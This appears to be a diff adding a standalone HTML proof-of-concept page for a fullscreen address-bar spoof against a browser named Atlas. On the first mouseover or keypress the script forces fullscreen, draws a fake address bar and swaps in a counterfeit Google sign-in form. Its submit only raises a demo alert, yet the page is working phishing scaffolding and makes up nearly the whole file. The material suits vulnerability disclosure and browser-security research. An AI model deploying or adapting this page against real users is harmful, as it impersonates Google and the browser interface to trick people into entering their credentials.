@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fullscreen Address-Bar Spoof PoC (Atlas)</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html, body { width:100%; height:100%; background:#f2f2f2; font-family:Arial, sans-serif; }
+  body { display:flex; align-items:center; justify-content:center; }
+  .hint {
+    position:fixed; bottom:24px; left:50%; transform:translateX(-50%);
+    background:#111; color:#fff; padding:10px 14px; border-radius:8px; opacity:.85; font-size:14px;
+  }
+  .address-bar {
+    position:fixed; top:0; left:0; width:100%; height:90px; z-index:9999;
+    object-fit:cover; display:block; border-bottom:1px solid #ccc; user-select:none; pointer-events:none;
+  }
+  .login-container {
+    background:#fff; padding:36px 40px; border-radius:10px;
+    box-shadow:0 10px 28px rgba(0,0,0,.25); width:360px; text-align:center; margin-top:80px;
+  }
+  .logo { font-size:48px; font-weight:700; margin-bottom:20px; user-select:none; }
+  .g{color:#4285F4}.o1{color:#EA4335}.o2{color:#FBBC05}.g2{color:#4285F4}.l{color:#34A853}.e{color:#EA4335}
+  h1 { font-weight:400; font-size:22px; margin-bottom:18px; color:#202124; }
+  input { width:100%; padding:12px 14px; margin:8px 0 18px; border:1px solid #dadce0; border-radius:4px; font-size:16px; }
+  input:focus { border-color:#4285F4; outline:none; box-shadow:0 0 4px rgba(66,133,244,.5); }
+  button { width:100%; padding:12px; font-size:16px; border:none; border-radius:6px; background:#4285F4; color:#fff; cursor:pointer; }
+  button:hover { background:#357ae8; }
+  .footer { margin-top:16px; font-size:12px; color:#666; user-select:none; }
+  .cover { position:fixed; inset:0; }
+</style>
+<script>
+  function enterAttackUI() {
+    // Replace the page with fake chrome + phishing form
+    document.body.innerHTML = `
+      <img src="spoof.png" alt="Spoofed Address Bar" class="address-bar" />
+      <div class="cover" aria-hidden="true"></div>
+      <div class="login-container" role="dialog" aria-label="Google Sign-In">
+        <div class="logo" aria-hidden="true">
+          <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+        </div>
+        <h1>Sign in to your Google Account</h1>
+        <input type="email" placeholder="Email or phone" autocomplete="off" />
+        <input type="password" placeholder="Password" autocomplete="off" />
+        <button onclick="alert('Demo: fake submit')">Next</button>
+        <div class="footer">© 2025 Google</div>
+      </div>
+    `;
+  }
+
+  async function goFullscreen(el) {
+    const docEl = el || document.documentElement;
+    const req = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.msRequestFullscreen;
+    if (req) {
+      try { await req.call(docEl); } catch(e) { /* swallow for demo */ }
+    }
+  }
+
+  function triggerAttack() {
+    goFullscreen().finally(enterAttackUI);
+  }
+
+  // Minimal interaction: first mouseover anywhere triggers fullscreen + spoof
+  function installMinimalTrigger() {
+    const once = { once: true, passive: true };
+    document.addEventListener('mouseover', triggerAttack, once);
+
+    // Helpful fallbacks to improve repro on different builds
+    document.addEventListener('pointerdown', triggerAttack, once);
+    document.addEventListener('keydown', (e) => {
+      if (['Enter',' '].includes(e.key)) triggerAttack();
+    }, once);
+
+    // Optional on-load hint (for demo clarity)
+    const hint = document.createElement('div');
+    hint.className = 'hint';
+    hint.textContent = 'Move your mouse over the page…';
+    document.body.appendChild(hint);
+  }
+
+  window.addEventListener('DOMContentLoaded', installMinimalTrigger);
+</script>
+</head>
+<body>
+  <!-- Empty body; the attack triggers on first mouseover and replaces DOM -->
+</body>
+</html>
